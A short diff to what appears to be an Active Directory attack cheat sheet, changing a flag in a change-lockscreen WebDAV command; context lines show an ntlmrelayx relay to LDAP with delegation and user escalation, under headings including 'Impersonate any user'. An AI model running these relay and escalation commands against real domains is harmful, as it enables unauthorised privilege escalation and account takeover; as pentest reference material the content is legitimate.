@@ -810,7 +810,7 @@ sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --delegate-access --escalate-user
 #### Change lockscreen image
 - https://github.com/nccgroup/Change-Lockscreen
 ```
-change-lockscreen --webdav \\webdav@80\
+change-lockscreen -webdav \\webdav@80\
 ```
 
 #### Impersonate any user
